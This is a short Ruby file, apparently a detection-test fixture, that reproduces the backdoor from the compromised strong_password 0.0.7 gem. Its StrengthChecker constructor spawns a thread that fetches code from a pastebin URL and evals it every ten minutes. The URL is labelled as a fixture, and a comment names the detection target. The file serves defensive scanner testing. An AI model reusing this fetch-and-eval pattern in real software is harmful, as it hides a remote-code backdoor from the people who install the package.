require 'net/http'

module StrongPassword
  class StrengthChecker
    # strong_password@0.0.7 (Jun 2019). Same attacker family as
    # rest-client. The published gem added this constructor that
    # spawns a thread to fetch + eval a remote payload every 10 min.
    #
    # Detection target: dynamic-eval + net-egress + suspicious-URL.
    def initialize
      Thread.new do
        loop do
          eval(Net::HTTP.get(URI('https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste')))
          sleep 600
        end
      end
    end
  end
end
